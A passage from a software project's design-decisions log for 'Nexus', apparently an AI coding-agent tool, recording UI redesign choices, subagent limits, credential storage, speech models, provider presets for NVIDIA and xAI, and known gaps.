pressed queue chip is reversed. Spinner frames, status marks and queue controls have ASCII twins.

## Known gaps and drift (as of this writing)

Stated so nobody builds on a false assumption.

- **Compaction has no summarizer by default:** `Runtime` injects one only for the handoff
  path with `handoff_brief = "summarized"`. With defaults, `hybrid` compaction is
  evict-then-drop, and `strategy = "summarize"` fails actionably ([context.md](context.md)).
- **Code mode (kernel) gaps, as of 2026-10-24** ([tools.md](tools.md#code-mode-the-kernel-tools)):
  - Subagents get no kernel yet; kernel plan §3.10 says they should.
  - `code_run` is `exclusive` while mutating tools are attached to **any** kernel in the
    runtime (`kernels.states()`), not only the calling agent's kernel.
  - Idle eviction writes no event, so the Session sidebar cannot show "evicted"; an evicted
    kernel reads as active until its next cell.
  - Linux execution and cross-version Monty snapshot compatibility are unverified
    ([codemode-monty-compat.md](codemode-monty-compat.md)).
  - The live-model trial (plan phase 6: start, run, inspect, attach, restart, restore) has not
    been run; the kernel is covered by offline and PTY tests only.
- **`[permissions] mode` defaults to `allow` in the schema** but `ask` in
  `PermissionEngine`'s constructor and in examples; set it explicitly.
- **Root `README.md`** still says raw GitHub Copilot is omitted, that the web
  frontend is deferred, and suggests `summarize` for context overflow; the code
  differs (see above and [web.md](web.md)).
- **`examples/nexus.toml`** predates `.agents/`, `default_type = "task"` and
  lowercase tool names. [config.md](config.md) is authoritative.
- **Docstrings** in `hooks/__init__.py` and `examples/hooks.toml` mention
  `.nexus/hooks.toml`; the canonical path is `.agents/hooks.toml`.
- **Voice** real-model inference, platform support and network behavior are
  unverified. **Copilot** device sign-in is not live-tested.
- **Not done:** `nexus ext restore`. Background shell job completion
  notifications (plan P5) are implemented and focused-tested, but the shell plan
  as a whole is not complete (P6/P7 and the P4 Ratatui panel remain).

## Standard installation includes Claude Agent; the installer adds voice

Claude Agent SDK and `sounddevice` are required package dependencies; the old
`claude-agent` extra remains a compatibility alias. The voice runtime
(Transformers, Torch, `constriction`) and speech (`ptts`) became base
dependencies after `uv sync --extra speak` removed the voice packages and
`nexus voice init` then failed: extras are not sticky under `uv sync`. The
dictation packages carry markers for macOS arm64 and Linux x86_64 (the platforms
with Torch and `constriction` wheels in `uv.lock`), so Intel Macs and Linux aarch64 still install.
PEP 508 markers cannot tell musl from glibc, so `install.sh` rejects musl x86_64
with an actionable diagnostic rather than pretending to remove required dependencies
using always-false override markers. `--no-voice` is retained as a legacy flag with
a warning; disable dictation with `voice.enabled=false`, not dependency removal. The `voice` and `speak`
extras stay as compatibility aliases, and `nexus voice init` still installs the
runtime elsewhere. Claude login and the consent-gated model downloads remain
separate setup steps; defaults enable the features but never record or speak
unprompted. Platform support beyond the lock's wheels is not verified (see
[voice.md](voice.md)).

## The 2026-10 UI redesign: picks from the design mock-ups

The 26 elements in the (since removed) Textual `design-mockups/` were judged variant by variant and the
picks applied to both surfaces ([surfaces.md](surfaces.md) has the result).
Notable choices and why:

- **Two-row top bar (tabs, then breadcrumb + status).** Several sessions run at
  once; tabs make every active one one click away with its status glyph, and the
  breadcrumb answers "where does this session work" (directory, worktree,
  branch). Closing a tab only hides it: sessions are daemon state, not window
  state, so tabs are in-memory per window (not persisted, not shared).
- **Branch from `.git/HEAD`, no subprocess** (`host_support/git_head.py`, in the
  Doctor report). Bounded file reads keep the health poll cheap and safe.
- **Problems-first logs.** Warnings and errors are what a reader opens logs for;
  the info/debug lines stay one click away, counted, never dropped.
- **Context header keeps today's chips**, adds grey token estimates and one-line
  previews; full text stays in the dialogs. **Tools dialog as a family table**
  and **Skills with a Markdown body** (SKILL.md through `SettingsRead`, so the UI
  still reads no files). **Usage by turn** in the Context dialog uses recorded
  provider usage, next to the estimated next request.
- **Tiered pricing** (models.dev `cost.tiers`) is parsed into `Cost.tiers`, used
  for cost accounting, and surfaced as `pricing` in the request context so the
  meter can mark where the price rises; it is advisory display, not a limit.
- **Thought headline** labels reasoning the provider did not share instead of
  showing nothing, so the user sees the model did reason.
- **Fuzzy search** (`ui_support/fuzzy.py` + `js/fuzzy.js`, same constants) for the
  model picker and web palette; the native palette uses the shared fuzzy matcher.

Provider credentials use `~/.nexus/credentials.json` instead of the OS keychain to
avoid backend errors and access prompts. The file is plaintext with owner-only
permissions, atomic replacement and bounded cross-process locking. Keychain
records are not read or migrated automatically; existing users sign in again.
The legacy `auth = "keychain"` configuration spelling remains compatible and
now selects the file-backed pasted-key flow. Claude CLI credentials remain
owned by Claude.

## Cross-project sessions in shared hosting

The sidebar uses the shared SQLite metadata index to group sessions by recorded
project root, ordered by each project’s newest activity, then local date. Folder
names label projects; equal names show full paths. Opening a foreign session routes to its owning project runtime in the shared
daemon, changes the connection focus and retains subscriptions. Foreign rows
show saved activity until opened. Tools, settings and permissions belong to the
session’s project.

## Ratatui prototype boundary

The native subprocess ships through `setuptools-rust` alongside the Python
console script; the existing setuptools package-data declarations remain intact.
This keeps crash isolation and avoids an unused PyO3 boundary. The alternative
maturin/PyO3 design in the earlier feasibility work remains an option if measured IPC
cost warrants it. Rust sources and Cargo.lock are included in the sdist; release
wheels require native platform builds. The first macOS arm64 wheel was built and
installed locally; other targets are not verified.

## Native TUI overlays and black theme (2026-10-02)

Native conversation/dialog backgrounds are explicitly black rather than terminal
transparent. Simple inspection/picker views are bounded overlays, root-agent
selection is anchored above the composer, and Settings editing keeps a full page.
An explicit presentation field separates placement from title wording. Provider
usage opens from cached data before fetching to keep the interface responsive;
refresh failures preserve useful data and show the error.

Subagent failures hand their context back instead of losing it. A failed child
returns a deterministic digest (no model call) and a saved markdown report, and
the root reads it and writes the next `task` prompt itself; a `resume_from` tool
field was removed because models filled the optional string with `""`, `" "` or
`"none"` and failed three spawns in a row. A model-written wrap-up was not chosen
because it would need a call exactly when the limit, budget or provider has already
failed. The iteration cap now defaults to unlimited (`max_iterations = 0`); the
wall-clock and token limits remain the automatic stops.

Subagents have no wall-clock deadline (2026-10-17). A high advisor on an
external Claude Code worker was killed at the 600 s `timeout_seconds` default.
The native child runner and both external workers (Claude Code, Antigravity)
now ignore `timeout_seconds` and `[agent] max_turn_seconds`; the latter applies
to root turns only. Cancellation, native iteration caps and token budgets remain.
`timeout_seconds` is still accepted in provider sections (deprecated, ignored)
so existing configs load. agy's required `--print-timeout` is set to one year.
Network, shell, MCP and tool timeouts are unchanged.

The wall clock is now unlimited by default too (`max_turn_seconds = 0`,
2026-10-08). The 30-minute default silently ended long turns right after a
tool result, without sending that result to the model, and a parent's clock
includes time spent waiting on subagents. Users saw the agent stop mid-task.
No limit is applied automatically now; any positive limit is opt-in, and a limit
stop is labelled in the turn footer.

## Native redesign: layout, context and incremental rendering (2026-10-02)

Tool grouping is a pure helper consumed by native projection. Full-height sidebars replace the lower
Logs pane. At constrained widths the most recently opened sidebar takes priority,
with a narrow right overlay; saved visibility remains intact across resizing. The narrow
drawer used to cover the conversation; the conversation now reflows beside it so nothing is clipped.
Open sessions are marked in the Sessions list when its presence removes center tabs.

Context inspections can be refused during a turn. Keep the last successful preview
with its timestamp and label it as cached, while taking accent identity from the
current selected agent. Never infer context tiers or model windows from defaults.

Schema 2 sends changed block suffixes to avoid encoding and parsing the entire
history for each token. These dependent patches must be applied in sequence;
only schema 1 full snapshots can be coalesced. Stable revisions let the renderer
reuse wrapped history and indexed row ranges. Terminal output is buffered to
reduce per-cell system calls. The synthetic PTY benchmark meets latency budgets,
but streaming CPU remains above its target; it is not evidence of live-provider
end-to-end latency.

## Tool failures are not marked in the timeline

A failed tool call does not turn its group red, show `✗`, or add `· N failed`:
the loop recovers on its own, so the mark is noise. The error text stays in the
expanded call detail (nothing the agent saw is hidden). Header chips for skills
and MCP show unlabelled `project global` counts for the same reason: the order is
fixed and the section dialog names the scopes.

## Native transcript copies the OpenCode row layout

Thought duration comes from event timestamps in the reducer rather than from the
UI, so every surface and a replay agree. Subagent pages drop the context header
for a task prompt card to match the reference design; inspecting a child's
context chips from its page is the cost of that choice.

## Session titles are a side call, not a tool or a tag

A new session is named by one small request to a cheap model (the `low` tier by
default), started in the background after the first message. A title tool in the
session would run on the expensive model, pollute the agent's context and tools,
and break prompt caching; a title tag in the main reply leaks into the stream and
varies by provider. The side call is a plain request: no loop, no tools, bounded
input and output, a timeout, and any failure keeps the first-message title.

The title is metadata on the session row (`title_source`), not an event in the
log: it is not part of the conversation, and replaying it would change nothing the
agent sees. It is on by default, visible and switchable in Settings → Session
titles, which names the model the first message goes to (it can be another
provider than the session's). Cost: schema 2 means an older Nexus refuses the
shared database. Not done: re-titling later, manual rename (`user` is reserved).

## GPUI desktop reuses native host workflows

The desktop client is a separate Rust crate in `rust/desktop/`, using GPUI for
windowing, layout, rendering and native text input. It reuses the Ratatui
presentation bridge and includes its wire structs, so approvals, settings,
sessions, context and subagents keep one host-only implementation. UI geometry
and native input stay in Rust; providers and durable reduction stay in Python.
This avoids maintaining a second agent harness or copying the host protocol into
Rust. The cost is a Python presentation process and GPUI's pre-1.0 dependency;
GPUI is pinned and desktop packaging is separate from the terminal wheel.

## Subagent roles own their allowed tiers

Each subagent role lists the tiers it may use (`tiers:`, default first) so a quick
lookup cannot spin up a flagship and an advisor is never given the cheapest model.
The calling agent is told this in the `subagent` tool description. A request
outside the list moves to the nearest allowed tier with a note, never an error:
a model hint must not break delegation. `agents.max_tier` stays as a user ceiling
(default `high`; it was `medium`, which would have stopped the advisor ever
reaching `high`). Roles without `tiers` keep the old behaviour, so existing custom
agents change nothing until their owner opts in. Tier names are checked for shape
at parse time and resolved later, because custom tiers live in config, not here.

### One terminal client

Ratatui is the sole terminal renderer. Maintaining a second widget implementation
and its dependency stack is no longer part of the product. Missing native binaries
fail with build/install guidance. Optional binary builds still allow CLI/browser
installs on platforms without a Rust toolchain; terminal chat requires the binary.

## Desktop keys follow the terminal, with Cmd aliases

The shared `ui_support/shortcuts.py` tables are canonical for the desktop as well
as Ratatui: every `SHORTCUTS` and `LEADER_SHORTCUTS` row has a desktop route, and
`tests/test_desktop_keymap_parity.py` enforces it. Ratatui meanings win where they
collide with macOS text editing; `Cmd` bindings are aliases only. This is why
`Ctrl+E` toggles the Logs drawer rather than moving to end of line (`Cmd+→` does
that), matching the terminal. New leader rows (`c` context popover, `z` update
help) were added to the shared table because the terminal and web already handled
them; the desktop now routes them too. The transient Ctrl+X leader is expressed
with GPUI multi-stroke bindings. Scoped keys never intercept typing: `a`, the
PageUp/PageDown transcript scroll and the `[` / `]` inspector tabs carry
`!Editor`, and `Ctrl+S` saves only inside the `Form` context. See
[desktop.md](desktop.md#keys).

## Desktop overhaul starts with measured performance

The desktop source launcher prefers a release binary to a newer debug binary,
with dependency optimization in dev builds and a warning for debug fallback.
Composer synchronization is debounced while native editing stays local. Bounded
CPU traces identify bridge/render costs before the store and visual overhaul;
they do not claim display FPS. Transcript rows borrow the projected content
directly, avoiding per-frame deep copies without a duplicate Arc store. See
[desktop.md](desktop.md#overhaul-performance-foundation).


### Terminal interaction and incremental mirroring

Tool/group/output, thought and turn folding belong to Rust. Python supplies
complete labelled, redacted presentation and remains the canonical session reducer
and host-action owner. Local disclosure sends no action. Sidebar/tab/file/log
changes use optimistic state plus ordered acknowledgement numbers, allowing prompt
redraw without stale persistence echoes reverting newer choices.

Terminal schema 3 omits unchanged sections and carries ordered transcript suffixes;
this avoids retransmitting session/history/sidebar data per token. Omitted
one-shots never replay. Ordinary root deltas reuse the projected history and
wrapped row prefix. Other events and child pages retain full projection for
correctness; an open subagent page skips the unused root projection and reuses
per-turn safe blocks and the modified-files scan. Desktop keeps its encoder. This boundary avoids duplicating domain
reduction in Rust while removing presentation round trips. Large first-load and
first-wrap costs remain explicit benchmark cases.

The host's `state()` (a full reducer fold of the session log, run on the host
loop) is cached per session and extended with only the new events; a log that no
longer matches the cached last event is refolded. Opening a subagent page used to
cost one full fold per click (about 160 ms at 500 turns, stalling every client).

Development launches take the most recently built native binary, so a plain
`cargo build` or `cargo test` makes the unoptimized debug build the one `nexus chat`
runs. Build with `--release` when judging feel (release draw/key→frame measured
3–6× faster than debug).

Older turns start folded: only the newest two turns of a page are open by default
(`RECENT_TURNS` in `rust/tui/src/disclosure.rs`). Older turns are rarely what the
reader wants, and a folded turn costs the layout almost nothing. The window is
computed from the blocks Rust already holds, so it is local and needs no host
round trip; when a new turn pushes the oldest out, the layout is told to rebuild
from that turn because no patch covers it. Python still projects and sends the
folded turns; lazy loading of old turns is a separate, undecided change.

Terminal presentation no longer redacts credential-shaped text. The idea of Nexus is
that the user sees what the agent sees, and the six regex passes per field were the
largest cost of a cold projection (about 58% at 300 turns, so a session switch or
close lagged). `ui_support/text.py` still escapes terminal controls and caps length;
`util.redact_secrets` still covers logs, errors and host-boundary messages. The
browser client's `redactToolText` (`ui/web/js/app.js`) still redacts: not changed.

Switching sessions keeps each open tab's reduced view and cursor
(`SessionController._parked`, up to 8) and returns by reading only newer events; the
projected-turn cache is keyed by session and bounded at 64 MiB (`TURN_CACHE_BYTES`)
instead of being cleared. The context preview refreshes in the background rather
than before the first paint.

The terminal loop paces frames at 16 ms (`FRAME_INTERVAL`, `rust/tui/src/main.rs`):
a wheel fling used to draw hundreds of near-full-screen frames faster than a terminal
parses them (32 MB over 8,000 events, 2.6 MB paced), so a reversal waited behind the
backlog. The spinner clock advances on every loop pass, not only when input is idle.
Slow phases (over 50 ms) are logged to `~/.nexus/tui-stalls.log`.

Startup paints before it loads: the native client is spawned before the daemon connection
and shows a splash until the first snapshot. Only the session bootstrap and context preview
gate that snapshot; `doctor`, `list_models` and `setup_status` were each awaited in sequence
before the process even started (about 0.9 s) and now run in the background. Typing during the
splash is discarded, not buffered, because a draft would otherwise be submitted against a
session the host has not opened. The splash (step 12 of the design overhaul) is progress-driven,
not timed: a fixed-length animation would either lie about a slow start or add latency to a fast
one, so the bar and the particles follow client-observed milestones, with only a ~0.64 s floor
so a fast start still shows the motion and no ceiling. The milestone names are the plan's; they
are what the client can see (pipe open, first line, parsed, first snapshot applied), because the
bridge reports no startup stages and no host change was wanted for a cosmetic. The notifications
history is client-side for the same reason it is not durable: it is a replay of what the client
showed, `/notifications` only flips a counter the client watches, and `Ctrl+X Shift+N` is used
because `Ctrl+X n` is `/new`. Known gap: `doctor` still takes about 0.7 s because it waits on
`runtime.ensure_started()`, which parses the whole model catalogue; the branch appears late.

## Settings revamp (native client)

Workspace, Config, Soul and Hooks are hidden from the native Settings list for now;
Settings is left only by an explicit close, never by an operation kind missing from
an allow-list. A run-mode switch on an agent removes the other mode's fields so the
file never holds a model and tiers that contradict each other. Not verified: native
PTY rendering of the revamp.

## Toasts replace the shell notice (2026-10)

A notice was one string rendered as an `Error:` transcript line, whatever it was
("Copied 120 characters" and an exception looked alike) and it lingered until the
next event. Toasts carry a level, expire, and can be dismissed. The host owns *what*
happened (id, level, text, optional action); the client owns *when* it disappears
(timers, hover pause, dedup, dismissal), the same split as hover state, so no
round-trip is needed to expire one. Ids are time-seeded so a restarted Python process
cannot produce ids the client has already seen. Persistent conditions stay where
they were (disconnected banner, update chip, transcript projection failures);
toasts are for events. Every toast is mirrored to the Logs tab, so ephemerality never
hides information. Esc does not dismiss toasts because Esc already stops and closes.
The widget kit lives in `rust/widgets` so the design mock-ups and the TUI share one
implementation.

## Settings are typed pages the host builds and the client renders (2026-10)

Settings had grown into menus with pages inside pages, and the rule that kept it
"still Settings" (an allow-list of operation kinds) was the likely cause of Settings
closing unexpectedly. A page is now data: the host builds it from host results, the
client renders it, and every operation rebuilds it. That makes "never close
unexpectedly" structural (an operation cannot replace the page with a panel), keeps
the client free of settings logic (it only knows controls), and keeps what is shown
equal to what the host reports (no optimistic local values to drift). The cost is a
host round trip per change, which is local and fast. Scope is a property of the area
(only per-file areas have it), not of the page chrome, so always-global areas never
imply a choice that does not exist. Drill-ins are limited to editors, pickers and
confirmations, which stack on the page and return to it.

## Context header sections (identity-only System prompt, thin Tools list)

The System prompt row is identity and soul only; Environment, AGENTS.md, MEMORY.md,
Skills, Tools and MCP each own their part, so rows sum without double counting and
nothing the agent sees is hidden. Tools is a one-line-per-tool `list` panel with the
detail on a second `detail` page (≤ 88 columns, as tall as its text), because a
full-width grouped list buried the one number people look for (the token cost).
Skills are cards (one selectable item with dim rows) that open a skill page; MCP is a
thin `list` like Tools (one line per server, token column, Restart chip) that opens a
server page, all through host commands. The dev MCP server lives in `devtools`
and is wired only by the sandbox's generated `mcp.json`, so the product path never
imports it. Empty blocks are greyed, and the header has no total footer or overflow
text; the five-row inventory cap is therefore silent (a known tension with "clipping
is announced"). Toggling from a tool page works in place (the list underneath is
rebuilt); not verified on the desktop client.

## File changes stand alone; MCP restart is a host command (2026-10)

Activity groups fold reads, searches and commands into one summary line, which is
right for exploration but hid the changes a reader most wants to check. Edits,
writes, patches and questions are therefore never folded: each is its own `change`
row with the path and `+added −removed`. The row starts closed (the header already
names the file and the size of the change, and open diffs crowded out the reply);
Enter opens a unified diff in add/delete colours (a group of one repeated its header
as a member row and hid the diff behind a second click). MCP Restart is a host
command (`McpServerRestart`) rather than a client-side reload because only the
daemon owns connections; the connection is shared, so a restart is visible to every
session. Refresh reuses `ExtensionsReload`, which already reconciles `mcp.json`, so
there is one path for picking up new servers. Refresh then restarts not-connected
servers, because reload alone leaves a failed server waiting out its backoff. A leading `/` runs a command only when
the first word is a known command or a bare word; anything path-shaped is prose,
trading silent sends of `/foo.bar` typos for never refusing a pasted path. The
80-column centered conversation is a local terminal preference, like the sidebars.
Rust rendering of the Restart chip and centered layout is covered by unit tests;
not verified in a real terminal.

## `/speak` uses Paradee on ONNX, not Kokoro on torch (2026-10)

Paradee-8M-v1.0 (Apache 2.0) is an 8M-parameter model distilled from Kokoro-82M
that speaks Kokoro's af_heart voice. Its int8 ONNX file is 9 MB against about
325 MB for Kokoro's weights, so the download is about 25 MB with the spaCy English
package. It runs on onnxruntime's CPU provider with no torch, so the speak extra
is lighter and there is no MPS or device setting. The model card reports UTMOS
4.41 (Kokoro 4.52) and the same WER (5.7%); quality was not re-measured here.
One benchmark on an Apple M4 measured a 2.0 s cold load (Kokoro 2.5 s), a
paragraph at about 34x real time (Kokoro 9x) and 0.5 GB peak memory (Kokoro 2.6 GB).
Trade-offs: one voice (the language and device choices are single-valued now);
phonemes come from misaki with `fallback=None`, so words missing from its
dictionary are dropped rather than spelled by espeak. The speak extra names
`misaki` with `spacy` and `num2words` instead of `misaki[en]`, because the `en`
extra pulls `spacy-curated-transformers` and with it torch. Code:
`nexus/host_support/speech.py`, `nexus/ui_support/speech_settings.py`; the
behavior is in [voice.md](voice.md#speak-the-latest-answer-terminal-clients).

## Speech survives upgrades without asking again (2026-10)

An upgrade must not make a user who already speaks answers reinstall, re-init or
re-consent. Three things used to break that: `nexus update` could drop the
`speak` extra, spaCy's English package was pip-installed into the tool venv (which
`uv tool install --force` replaces, and which has no pip at all), and a release
that changes the model showed the consent dialog again. So `update_extras` keeps
`speak` the way it keeps `voice`; the phonemizer wheel is unpacked under
`~/.nexus/models/speech/python`; and consent is a durable fact (a consent file,
or an earlier Kokoro/Paradee cache), after which the daemon fetches a missing
model by itself and `/speak` waits for it and speaks. The consent covered a local
speech model of the same kind, a few tens of MB; a much larger model would need
asking again. Re-running `install.sh` (rather than `nexus update`) does not read
the old receipt, so it keeps `speak` only when passed in `--extras`; not changed here.

## `nexus uninstall` removes all data, after asking (2026-10)

`uv tool uninstall` leaves `~/.nexus` behind on purpose, so there was no way to remove
Nexus completely without knowing every path it writes. `nexus uninstall` deletes the
whole Nexus home rather than a list of known files, because the home gathers entries
the docs do not list (handoffs, search server state, model preferences); a list would
miss them. Deleting a whole directory is only safe when it really is the Nexus home,
so `/`, the user's home and its parents, and a custom `NEXUS_HOME` without `nexus.db`
are refused. It asks with a plain `[y/N]` after listing every path and size, and needs
`--yes` without a terminal. The Hugging Face cache is shared with other tools, so only
the two speech model folders are removed. Project files are not Nexus state and are kept.

## `context.on_overflow` defaults to `handoff`, soak waived (2026-10)

The unified sessions plan gated the default flip on a maintainer soak and a
real-provider completion-rate comparison. Neither was run: the only data is
synthetic benchmarks and one dossier snapshot with zero handoffs. The maintainer
explicitly chose to waive the soak and make `handoff` the default now. The default
is therefore **not** validated by real use or provider quality evidence; the flip is
a product decision, and P7 (bounded assembly reads) stays deferred. Rollback is a
config flip: `context.on_overflow = "compact"` keeps the earlier behavior unchanged,
and the default applies only when the effective config is v2: no config at all or
only v1 layers (environment overrides do not promote) remain on compaction, while
any v2 layer promotes the whole configuration to `handoff`. The config version
policy is unchanged. Plan:
`plans/planning/01-unified-sessions-and-handoffs.md`; behavior in
[context.md](context.md).

## Composer `!` shell output is context, not a prompt

`!command` runs with bash and its bounded output is added to the model context
as a user message without starting a turn: the user is showing the agent
something, not asking it to act. During a turn the output waits for the next
safe boundary (never between a tool call and its result) and does not extend
the turn. Each run is drawn as a `shell` turn reusing the `bash` tool row, so
the user sees exactly what the agent will see. Shell output (tool and `!`)
is capped at 2,000 lines or 50 KiB; the full text goes to a private temp file
named in the result instead of being silently cut.

## GPT Live: delegation, not a second voice agent (2026-10)

The voice model only talks; it hands work to the session the user already has
open through `delegation.created`, and the bridge enqueues it as an ordinary user
message (idle: queue, running: steer; `input.queued` carries an `origin` label).
OpenCode's alternative is a hidden second LLM session with control tools. We took
oh-my-pi's shape: it costs no extra model, adds no reasoning hop, and keeps
everything the voice model "did" visible as a plain user message in the
transcript. Status, steer and stop reuse Nexus mechanics (progress appends, steer
mode, Esc). A spoken "stop" and OpenCode-style control tools are deferred.

## GPT Live: the audio helper runs on the client side

Microphone permission attaches to the terminal or app that captures (dictation
already works that way); a detached daemon may have no TCC attribution. So the
helper process is spawned by the client and exchanges only SDP and small JSON
events with the daemon. The daemon owns signaling and the sideband WebSocket, so
credentials never leave it. Not verified on macOS yet (helper is milestone M3).

## GPT Live: approvals are UI-only

Voice never answers a permission or a question. The bridge announces "the user
must approve this on screen" and nothing else; the mis-heard "yes" that runs
`bash` is the failure we refuse to allow. The bridge observes the session through
`Session.observe()`, a tap that is not a viewer, so a call cannot make an
unattended session look attended or change the unattended policy.

## GPT Live: the protocol is undocumented

Endpoints, headers and event names are re-implemented from two MIT-licensed
reference integrations at pinned commits (`nexus/live/NOTICE`), without copying
code, and none of it has been run against the real service. Choices recorded:
the `originator`/`User-Agent` are the `CodexOAuthManager` identity (`nexus`),
because the notes show no evidence the server requires another (one reference
claims the Codex desktop app, the other its own name; whether `nexus` is
rejected is not verified); attestation is omitted; a sideband 401/403/429 is not
retried; a non-fatal `error` event is forwarded and the call continues, a fatal
one (401 or an auth code) ends it; the sideband is the only event source (not the
data channel); newline-joined delegation parts; the three per-call UUID headers
are random, not the Nexus session id. Fail closed, label experimental.

## GPT Live: streaming captions are persisted, coalesced

The session event sink persists first and fans out second; it has no
non-durable fan-out, and the subscribe watermark drops any event without a fresh
`seq`. A bus-only path would mean touching `Session.subscribe` and every follower,
so instead `live.transcript.delta` (the current partial caption) and `live.phase`
are persisted at most 4 times a second, only on change, and replay folds them
harmlessly. `live.levels` is in the catalogue but never emitted by the daemon:
clients draw their meter from the helper's own output. Revisit if a bus-only
path appears.

## NVIDIA is a preset over the Chat Completions adapter (2026-10)

NVIDIA's hosted catalogue is a standard OpenAI-compatible Chat Completions
endpoint (Pi's `nvidia.ts`; models.dev lists `@ai-sdk/openai-compatible`), and
`reasoning_content` already decodes. A config block could reach it, but could
not default the endpoint and `NVIDIA_API_KEY`, send the billing-origin header
OpenCode's plugin sends (with a Nexus value, not OpenCode's referrer), or make
the catalogue resolve `nvidia/...` without a `base_url`. `providers/nvidia.py`
is therefore a thin subclass; the registry lets the direct id win over the
generic `npm` signal. Unverified against the live API.

## xAI is a preset over the Responses adapter, not a new parser (2026-10)

Grok speaks the OpenAI Responses wire with the standard reasoning-summary
events (OpenCode's `xai-responses` protocol differs only in hosted-tool
vocabulary). A config block could already reach it, but could not express
`store: false`, the `x-grok-conv-id` cache header, or xAI's PNG/JPEG/WebP-only
image rule, so `providers/xai.py` subclasses `OpenAIProvider` through small
hooks (`_prepare_request`, `_finalize_body`, `_headers`) instead of copying
its decoder. Hosted tools need new timeline semantics and the WebSocket
transport is an optimisation, so neither is implemented.

## xAI connects only through the SuperGrok subscription (2026-10)

The user asked for the subscription and nothing else, so xAI has one credential
route: `auth = "xai_oauth"`, a device-code sign-in from Settings → Providers.
API keys (config, `${env:XAI_API_KEY}`, a pasted key) are refused for xAI, and
`xai_oauth` is refused on any other section or `base_url`, so the subscription
token can only ever reach `cli-chat-proxy.grok.com` (the Grok CLI subscription
proxy used by the reference clients; `api.x.ai` is the API-key route and is
refused). Authenticated inference there is unverified live. As with Copilot, Nexus has no OAuth app of
its own and uses OpenCode's xAI client id and scope (attributed in
`auth/NOTICE`); it sends `referrer = nexus` rather than claiming to be OpenCode,
which xAI accepted in a live sign-in on 2026-10-14. Like the ChatGPT route, only
the refresh token is persisted. Not yet observed live: a token refresh after
expiry.

The proxy also answers HTTP 426 ("Your Grok CLI version (none) is outdated.
Please update to version 1.0.13 or later") unless the request carries
`x-grok-client-version`, `x-grok-client-identifier: grok-shell` and a
`xai-grok-cli` user agent (public report: can1357/oh-my-pi#5978; the exact
header set is not verified live by Nexus). Nexus does not pin a version, which
would claim a client it is not: it reads `version` (else `stable_version`) from
the user's `~/.grok/version.json` (one bounded 4 KiB file read, no subprocess,
strict `N.N.N[-tag]` format), unless the explicit `NEXUS_XAI_CLIENT_VERSION`
override is set (which takes precedence). With neither, the turn fails before any request with a message
naming both remedies; a 426 is re-reported with the sent version and
`grok update`. The user agent is exactly `xai-grok-cli`, because that is the
string the CLI proxy requires; this is a protocol requirement, and Nexus is not
the official Grok CLI and is not described as such. Authenticated inference on
the proxy with these headers remains unverified live.

## Usage reserve is elapsed share minus used share (2026-10)

The usage page answers "can I spend more?" for weekly and monthly limits with
one number: reserve = share of the window elapsed − share used (half the month
gone, 20% used → 30% in reserve). It assumes an even spending pace, which is a
heuristic, not a provider forecast, so it is labelled and explained on the page.
Shorter windows (5-hour) get none: they reset before pacing matters. Window
length comes from the host (`period_seconds`), never guessed from a label in the
client. Claude's CLI prints only reset text, so the host parses it (in the named
zone, inferring the year); an unparsed reset simply shows no reserve. The bars
became thin line glyphs (`━─`) and colour only the bar, so the rows read as
data rather than a wall of colour; `N% left` was dropped as the bar's track.

## The `agy models` list is cached until the model list refreshes (2026-10)

Every tier or default-model edit rebuilt the registry, which re-ran `agy models`
(network, 3.5-7 s) and re-parsed the 5.6 MB catalogue, so Settings > Models
lagged per edit. The probe result now lives on a `RegistryCache` owned by the
runtime and on disk (`cache/agy-models.json`). There is deliberately no TTL: the
list changes only when the user updates agy, which is what the model-list
refresh is for, so the agy list has its own refresh, separate from the models.dev
refresh: the `ProviderModelsRefresh` host command, a **Refresh models** button on
the Antigravity provider page that also shows the count and last-refreshed time
(kept in the cache file). Other triggers: a changed executable/section or an
empty cache. `ModelsRefresh` and catalogue re-fetches leave it alone. A failed probe
keeps the last good list. Tier-only edits skip the provider/registry rebuild
entirely (`Runtime.reload_tier_config`). Not verified: behaviour when agy is
upgraded without a refresh (the old list stays until refreshed).
## The sessions page shows both tails and reuses the composer (2026-10)

The sessions dashboard is a full-width list grouped by status, matching the
reference layout: location and `[Choose Alt+L]`, `+ New Agent`, Open Previous,
Worktree, and a two-line row. Hovering a row (or keyboard-selecting it) shows
the last user message and the last agent message. Those snippets live on the
session row (`last_user`, `last_agent`, schema 4), not on `SessionSummary`, so
ordinary session lists do not carry message text. The open session overlays its
live view on every snapshot. The composer below the list is the existing
composer; Enter sends to the selected session. Verified in a 140-column
dark capture (`artifacts/ratatui-parity/grok-dashboard-dark-140-unicode.png`):
status groups, header actions, the working row, and the existing composer
card. The keyboard-selected row is expanded into You / Agent lines. A live
`nexus chat` still shows the previous screen until it is quit and reopened,
because it keeps the release binary it was launched with.

## The native TUI has no left sessions sidebar; the dashboard and top bar replace it (2026-10)

The Ratatui client dropped the left Sessions sidebar (drawer, docked column, project
chips, filter, `F6` focus). Two surfaces covered the same job: the sidebar was a
second, narrower list of the sessions the dashboard already shows with more
context, and it cost 40 columns plus a drawer mode, a focus state and a client-side
filter that had to stay in step with the dashboard. Now `/sessions` (also `Ctrl+B`,
`Ctrl+O`, `Ctrl+S`) opens the dashboard, and the Grok-style top bar carries
`‹ i/n ›` to cycle the open sessions and a clickable `[Dashboard]`. The right
details sidebar stays: it shows facts about the current session, not a list of
others. The `sessions_sidebar` preference and snapshot key are kept only for the
GPUI desktop client, which still has its own sidebar; the Settings → Layout row is
gone. The web client keeps its sidebar (it is being deprecated, not changed).
Modals share one backdrop dim (`render::dim_backdrop`) instead of each drawing its
own scrim. Not verified: native screenshots of every modal kind over the dim.

## The native TUI gets a left sidebar again, with Projects, Sessions, Files and Git (2026-10)

The 2026-10 removal above stands for the *old* sidebar (a second, narrower copy of the
dashboard). The new one is a different surface: a docked column beside the conversation with
four tabs, so `/sessions` no longer replaces the conversation with a page. Decisions:

- **One list, two views.** The Sessions tab reuses `picker::Dashboard` and the host-side
  `SessionDashboard` (filter, rename, archive, permission answers) rather than a second
  implementation; Projects groups the same host rows by `repo`/`worktree` (`ProjectSessionsList`).
  `WorktreeList` is not used: it lists daemon-owned *agent* worktrees of the current workspace, not
  user checkouts.
- **The manager is not a row.** The host never lists it, and the presentation filters its identity
  again (`ui_support/sidebar.py::is_manager_row`) so a host change cannot leak it into the list.
- **New host commands instead of UI I/O.** Files and Git need data the UI must not read itself, so
  `DirectoryList` and `GitStatus` return bounded, redacted, path-checked results (`docs/host.md`).
  Refused: reusing `FileSearch` (a flat ranked search, not navigation) and `GitDiff` (a patch, not status).
- **Python owns state, Rust draws.** Open/closed, tab and width persist as `sidebar_open`,
